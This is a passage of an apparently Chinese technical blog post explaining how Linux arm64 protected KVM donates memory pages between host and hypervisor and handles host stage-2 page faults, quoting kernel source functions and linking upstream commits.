class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __pkvm_host_donate_hyp(u64 pfn, u64 nr_pages)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        u64 host_addr = <span class="built_in">hyp_pfn_to_phys</span>(pfn);</span><br><span class="line">        u64 hyp_addr = (u64)__hyp_va(host_addr);</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">pkvm_mem_donation</span> donation = &#123;</span><br><span class="line">                .tx        = &#123;</span><br><span class="line">                        .nr_pages        = nr_pages,</span><br><span class="line">                        .initiator        = &#123;</span><br><span class="line">                                .id        = PKVM_ID_HOST,</span><br><span class="line">                                .addr        = host_addr,</span><br><span class="line">                                .host        = &#123;</span><br><span class="line">                                        .completer_addr = hyp_addr,</span><br><span class="line">                                &#125;,</span><br><span class="line">                        &#125;,</span><br><span class="line">                        .completer        = &#123;</span><br><span class="line">                                .id        = PKVM_ID_HYP,</span><br><span class="line">                        &#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">host_lock_component</span>();</span><br><span class="line">        <span class="built_in">hyp_lock_component</span>();</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">do_donate</span>(&amp;donation);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">hyp_unlock_component</span>();</span><br><span class="line">        <span class="built_in">host_unlock_component</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __pkvm_hyp_donate_host(u64 pfn, u64 nr_pages)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        u64 host_addr = <span class="built_in">hyp_pfn_to_phys</span>(pfn);</span><br><span class="line">        u64 hyp_addr = (u64)__hyp_va(host_addr);</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">pkvm_mem_donation</span> donation = &#123;</span><br><span class="line">                .tx        = &#123;</span><br><span class="line">                        .nr_pages        = nr_pages,</span><br><span class="line">                        .initiator        = &#123;</span><br><span class="line">                                .id        = PKVM_ID_HYP,</span><br><span class="line">                                .addr        = hyp_addr,</span><br><span class="line">                                .hyp        = &#123;</span><br><span class="line">                                        .completer_addr = host_addr,</span><br><span class="line">                                &#125;,</span><br><span class="line">                        &#125;,</span><br><span class="line">                        .completer        = &#123;</span><br><span class="line">                                .id        = PKVM_ID_HOST,</span><br><span class="line">                        &#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">host_lock_component</span>();</span><br><span class="line">        <span class="built_in">hyp_lock_component</span>();</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">do_donate</span>(&amp;donation);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">hyp_unlock_component</span>();</span><br><span class="line">        <span class="built_in">host_unlock_component</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __do_donate(<span class="keyword">struct</span> pkvm_mem_donation *donation)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pkvm_mem_transition</span> *tx = &amp;donation-&gt;tx;</span><br><span class="line">    u64 completer_addr;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tx-&gt;initiator.id) &#123;</span><br><span class="line">    <span class="keyword">case</span> PKVM_ID_HOST:</span><br><span class="line">        ret = <span class="built_in">host_initiate_donation</span>(&amp;completer_addr, tx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PKVM_ID_HYP:</span><br><span class="line">        ret = <span class="built_in">hyp_initiate_donation</span>(&amp;completer_addr, tx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ret = -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tx-&gt;completer.id) &#123;</span><br><span class="line">    <span class="keyword">case</span> PKVM_ID_HOST:</span><br><span class="line">        ret = <span class="built_in">host_complete_donation</span>(completer_addr, tx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PKVM_ID_HYP:</span><br><span class="line">        ret = <span class="built_in">hyp_complete_donation</span>(completer_addr, tx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PKVM_ID_GUEST:</span><br><span class="line">        ret = <span class="built_in">guest_complete_donation</span>(completer_addr, tx);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ret = -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">host_initiate_donation</span><span class="params">(u64 *completer_addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  <span class="type">const</span> <span class="keyword">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        u8 owner_id = tx-&gt;completer.id;</span><br><span class="line">        u64 size = tx-&gt;nr_pages * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">        *completer_addr = tx-&gt;initiator.host.completer_addr;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">host_stage2_set_owner_locked</span>(tx-&gt;initiator.addr, size, owner_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hyp_initiate_donation</span><span class="params">(u64 *completer_addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="type">const</span> <span class="keyword">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        u64 size = tx-&gt;nr_pages * PAGE_SIZE;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">        *completer_addr = tx-&gt;initiator.hyp.completer_addr;</span><br><span class="line">        ret = <span class="built_in">kvm_pgtable_hyp_unmap</span>(&amp;pkvm_pgtable, tx-&gt;initiator.addr, size);</span><br><span class="line">        <span class="keyword">return</span> (ret != size) ? -EFAULT : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">host_complete_donation</span><span class="params">(u64 addr, <span class="type">const</span> <span class="keyword">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        u64 size = tx-&gt;nr_pages * PAGE_SIZE;</span><br><span class="line">        u8 host_id = tx-&gt;completer.id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">host_stage2_set_owner_locked</span>(addr, size, host_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hyp_complete_donation</span><span class="params">(u64 addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="type">const</span> <span class="keyword">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">void</span> *start = (<span class="type">void</span> *)addr, *end = start + (tx-&gt;nr_pages * PAGE_SIZE);</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">kvm_pgtable_prot</span> prot = <span class="built_in">pkvm_mkstate</span>(PAGE_HYP, PKVM_PAGE_OWNED);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pkvm_create_mappings_locked</span>(start, end, prot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * kvm_pgtable_stage2_set_owner() - Unmap and annotate pages in the IPA space to</span></span><br><span class="line"><span class="comment"> *                  track ownership.</span></span><br><span class="line"><span class="comment"> * @pgt:    Page-table structure initialised by kvm_pgtable_stage2_init*().</span></span><br><span class="line"><span class="comment"> * @addr:   Base intermediate physical address to annotate.</span></span><br><span class="line"><span class="comment"> * @size:   Size of the annotated range.</span></span><br><span class="line"><span class="comment"> * @mc:     Cache of pre-allocated and zeroed memory from which to allocate</span></span><br><span class="line"><span class="comment"> *      page-table pages.</span></span><br><span class="line"><span class="comment"> * @owner_id:   Unique identifier for the owner of the page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * By default, all page-tables are owned by identifier 0. This function can be</span></span><br><span class="line"><span class="comment"> * used to mark portions of the IPA space as owned by other entities. When a</span></span><br><span class="line"><span class="comment"> * stage 2 is used with identity-mappings, these annotations allow to use the</span></span><br><span class="line"><span class="comment"> * page-table data structure as a simple rmap.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return: 0 on success, negative error code on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">host_stage2_set_owner_locked</span><span class="params">(<span class="type">phys_addr_t</span> addr, u64 size, u8 owner_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">host_stage2_try</span>(kvm_pgtable_stage2_set_owner, &amp;host_mmu.pgt,</span><br><span class="line">                               addr, size, &amp;host_s2_pool, owner_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">kvm_pgtable_stage2_set_owner</span><span class="params">(<span class="keyword">struct</span> kvm_pgtable *pgt, u64 addr, u64 size,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="type">void</span> *mc, u8 owner_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">stage2_map_data</span> map_data = &#123;</span><br><span class="line">                .phys                = KVM_PHYS_INVALID,</span><br><span class="line">                .mmu                = pgt-&gt;mmu,</span><br><span class="line">                .memcache        = mc,</span><br><span class="line">                .owner_id        = owner_id,</span><br><span class="line">                .force_pte        = <span class="literal">true</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">kvm_pgtable_walker</span> walker = &#123;</span><br><span class="line">                .cb                = stage2_map_walker,</span><br><span class="line">                .flags                = KVM_PGTABLE_WALK_TABLE_PRE |</span><br><span class="line">                                  KVM_PGTABLE_WALK_LEAF,</span><br><span class="line">                .arg                = &amp;map_data,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (owner_id &gt; KVM_MAX_OWNER_ID)</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">kvm_pgtable_walk</span>(pgt, addr, size, &amp;walker);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">stage2_map_walker</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="keyword">enum</span> kvm_pgtable_walk_flags visit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">stage2_map_data</span> *data = ctx-&gt;arg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (visit) &#123;</span><br><span class="line">        <span class="keyword">case</span> KVM_PGTABLE_WALK_TABLE_PRE:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">stage2_map_walk_table_pre</span>(ctx, data);</span><br><span class="line">        <span class="keyword">case</span> KVM_PGTABLE_WALK_LEAF:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">stage2_map_walk_leaf</span>(ctx, data);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">stage2_map_walker_try_leaf</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">                                      <span class="keyword">struct</span> stage2_map_data *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">kvm_pte_t</span> <span class="keyword">new</span>;</span><br><span class="line">        u64 phys = <span class="built_in">stage2_map_walker_phys_addr</span>(ctx, data);</span><br><span class="line">        u64 granule = <span class="built_in">kvm_granule_size</span>(ctx-&gt;level);</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">kvm_pgtable</span> *pgt = data-&gt;mmu-&gt;pgt;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">kvm_pgtable_mm_ops</span> *mm_ops = ctx-&gt;mm_ops;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">stage2_leaf_mapping_allowed</span>(ctx, data))</span><br><span class="line">                <span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">kvm_phys_is_valid</span>(phys))</span><br><span class="line">                <span class="keyword">new</span> = <span class="built_in">kvm_init_valid_leaf_pte</span>(phys, data-&gt;attr, ctx-&gt;level);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">new</span> = <span class="built_in">kvm_init_invalid_leaf_owner</span>(data-&gt;owner_id);</span><br><span class="line">                    -&gt;<span class="built_in">FIELD_PREP</span>(KVM_INVALID_PTE_OWNER_MASK, owner_id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Skip updating the PTE if we are trying to recreate the exact</span></span><br><span class="line"><span class="comment">         * same mapping or only change the access permissions. Instead,</span></span><br><span class="line"><span class="comment">         * the vCPU will exit one more time from guest if still needed</span></span><br><span class="line"><span class="comment">         * and then go through the path of relaxing permissions.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">stage2_pte_needs_update</span>(ctx-&gt;old, <span class="keyword">new</span>))</span><br><span class="line">                <span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If we&#x27;re only changing software bits, then store them and go! */</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">kvm_pgtable_walk_shared</span>(ctx) &amp;&amp;</span><br><span class="line">            !((ctx-&gt;old ^ <span class="keyword">new</span>) &amp; ~KVM_PTE_LEAF_ATTR_HI_SW)) &#123;</span><br><span class="line">                <span class="type">bool</span> old_is_counted = <span class="built_in">stage2_pte_is_counted</span>(ctx-&gt;old);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (old_is_counted != <span class="built_in">stage2_pte_is_counted</span>(<span class="keyword">new</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (old_is_counted)</span><br><span class="line">                                mm_ops-&gt;<span class="built_in">put_page</span>(ctx-&gt;ptep);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                mm_ops-&gt;<span class="built_in">get_page</span>(ctx-&gt;ptep);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">WARN_ON_ONCE</span>(!<span class="built_in">stage2_try_set_pte</span>(ctx, <span class="keyword">new</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">if</span> (!<span class="built_in">stage2_try_break_pte</span>(ctx, data-&gt;mmu))</span><br><span class="line">                <span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Perform CMOs before installation of the guest stage-2 PTE */</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">kvm_pgtable_walk_skip_cmo</span>(ctx) &amp;&amp; mm_ops-&gt;dcache_clean_inval_poc &amp;&amp;</span><br><span class="line">            <span class="built_in">stage2_pte_cacheable</span>(pgt, <span class="keyword">new</span>))</span><br><span class="line">                mm_ops-&gt;<span class="built_in">dcache_clean_inval_poc</span>(<span class="built_in">kvm_pte_follow</span>(<span class="keyword">new</span>, mm_ops),</span><br><span class="line">                                               granule);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">kvm_pgtable_walk_skip_cmo</span>(ctx) &amp;&amp; mm_ops-&gt;icache_inval_pou &amp;&amp;</span><br><span class="line">            <span class="built_in">stage2_pte_executable</span>(<span class="keyword">new</span>))</span><br><span class="line">                mm_ops-&gt;<span class="built_in">icache_inval_pou</span>(<span class="built_in">kvm_pte_follow</span>(<span class="keyword">new</span>, mm_ops), granule);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">stage2_make_pte</span>(ctx, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pkvm_create_mappings_locked</span><span class="params">(<span class="type">void</span> *from, <span class="type">void</span> *to, <span class="keyword">enum</span> kvm_pgtable_prot prot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start = (<span class="type">unsigned</span> <span class="type">long</span>)from;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> end = (<span class="type">unsigned</span> <span class="type">long</span>)to;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> virt_addr;</span><br><span class="line">    <span class="type">phys_addr_t</span> phys;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">hyp_assert_lock_held</span>(&amp;pkvm_pgd_lock);</span><br><span class="line"></span><br><span class="line">    start = start &amp; PAGE_MASK;</span><br><span class="line">    end = <span class="built_in">PAGE_ALIGN</span>(end);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (virt_addr = start; virt_addr &lt; end; virt_addr += PAGE_SIZE) &#123;</span><br><span class="line">        <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">        phys = <span class="built_in">hyp_virt_to_phys</span>((<span class="type">void</span> *)virt_addr);</span><br><span class="line">        err = <span class="built_in">kvm_pgtable_hyp_map</span>(&amp;pkvm_pgtable, virt_addr, PAGE_SIZE,</span><br><span class="line">                      phys, prot);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>移除host和加入host用的是同一个函数 pte都是INVALID 只有owner id的区别</p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/807923e04a0f5c6c34dc2eb52ae544cb0e4e4e66">https://github.com/torvalds/linux/commit/807923e04a0f5c6c34dc2eb52ae544cb0e4e4e66</a></p>
<p>根据注释 这个函数就是unmap host stage2并且记录这个page的owner</p>
<p>但是如果owner是host的话为什么还要被unmap？ 因为是lazy </p>
<h3 id="Host-page-fault"><a href="#Host-page-fault" class="headerlink" title="Host page fault"></a>Host page fault</h3><p>Host mem abort 检查相应的owner id</p>
<p>pte是0表示host 非0表示非host 不能访问</p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/1025c8c0c6accfcbdc8f52ca1940160f65cd87d6#diff-7969c9fdf376542af1e6061b538248f414f446349207e6460671f07cdf5fb7beR239">https://github.com/torvalds/linux/commit/1025c8c0c6accfcbdc8f52ca1940160f65cd87d6#diff-7969c9fdf376542af1e6061b538248f414f446349207e6460671f07cdf5fb7beR239</a></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=OGM5YmUxZWFlNjIxMWNjZDk0NmQyZGYzMDRiZjY3NjlfVHhhNTJrNTFvUVZVcWhkNm04VWRCOTIwUGFmZnAxVVJfVG9rZW46Q2I5NGJQamJFb1pRcTh4WHR4Y2M4a1BhbmRlXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA" alt="img"></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGIyNzE5OGE4ZGU1MDk2MDgwOWQ1OWFmMzYzZDk4OWVfaEpmZmpSeDFRNE1EVmZkSEROVVJHdEVDQVJYOUh2bHNfVG9rZW46RmhmVGJ4NklSb3RwdzF4dzhyRmNyeWFCbm9kXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle_host_mem_abort</span><span class="params">(<span class="keyword">struct</span> kvm_cpu_context *host_ctxt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kvm_vcpu_fault_info</span> fault;</span><br><span class="line">    u64 esr, addr;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    esr = <span class="built_in">read_sysreg_el2</span>(SYS_ESR);</span><br><span class="line">    <span class="keyword">if</span> (!__get_fault_info(esr, &amp;fault)) &#123;</span><br><span class="line">        <span class="comment">/* Setting the address to an invalid value for use in tracing. */</span></span><br><span class="line">        addr = (u64)<span class="number">-1</span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * We&#x27;ve presumably raced with a page-table change which caused</span></span><br><span class="line"><span class="comment">         * AT to fail, try again.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addr = (fault.hpfar_el2 &amp; HPFAR_MASK) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    ret = <span class="built_in">host_stage2_idmap</span>(addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == -EPERM)</span><br><span class="line">        <span class="built_in">host_inject_abort</span>(host_ctxt);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">BUG_ON</span>(ret &amp;&amp; ret != -EAGAIN);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">host_stage2_idmap</span><span class="params">(u64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kvm_mem_range</span> range;</span><br><span class="line">    <span class="type">bool</span> is_memory = !!<span class="built_in">find_mem_range</span>(addr, &amp;range);</span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">kvm_pgtable_prot</span> prot;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    prot = is_memory ? PKVM_HOST_MEM_PROT : PKVM_HOST_MMIO_PROT;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">host_lock_component</span>();</span><br><span class="line">    ret = <span class="built_in">host_stage2_adjust_range</span>(addr, &amp;range);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        <span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">host_stage2_idmap_locked</span>(range.start, range.end - range.start, prot);</span><br><span class="line">unlock:</span><br><span class="line">    <span class="built_in">host_unlock_component</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">host_stage2_adjust_range</span><span class="params">(u64 addr, <span class="keyword">struct</span> kvm_mem_range *range)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kvm_mem_range</span> cur;</span><br><span class="line">    <span class="type">kvm_pte_t</span> pte;</span><br><span class="line">    s8 level;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">hyp_assert_lock_held</span>(&amp;host_mmu.lock);</span><br><span class="line">    ret = <span class="built_in">kvm_pgtable_get_leaf</span>(&amp;host_mmu.pgt, addr, &amp;pte, &amp;level);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">kvm_pte_valid</span>(pte))<span class="comment">//必须是invalid 这样后面map</span></span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pte)<span class="comment">// 必须是host自己的 否则权限出错</span></span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        u64 granule = <span class="built_in">kvm_granule_size</span>(level);</span><br><span class="line">        cur.start = <span class="built_in">ALIGN_DOWN</span>(addr, granule);</span><br><span class="line">        cur.end = cur.start + granule;</span><br><span class="line">        level++;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((level &lt;= KVM_PGTABLE_LAST_LEVEL) &amp;&amp;</span><br><span class="line">            !(<span class="built_in">kvm_level_supports_block_mapping</span>(level) &amp;&amp;</span><br><span class="line">              <span class="built_in">range_included</span>(&amp;cur, range)));</span><br><span class="line"></span><br><span class="line">    *range = cur;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> __host_stage2_idmap(u64 start, u64 end,</span><br><span class="line">                      <span class="keyword">enum</span> kvm_pgtable_prot prot)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">kvm_pgtable_stage2_map</span>(&amp;host_mmu.pgt, start, end - start, start,</span><br><span class="line">                      prot, &amp;host_s2_pool, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>idmap：identity map start，end-start，start</p>
<p>Host pf一定发生在hyp memory的大块范围 （例如8G长度）</p>
<p>这里的host_stage2_adjust_range会调整到4K 或2M 或1G大页的范围</p>
<p>这里其实权限很松 mem：RWX mmio：RW</p>
<h3 id="初始化pkvm"><a href="#初始化pkvm" class="headerlink" title="初始化pkvm"></a>初始化pkvm</h3><p>arm64&#x2F;kvm&#x2F;arm.c</p>
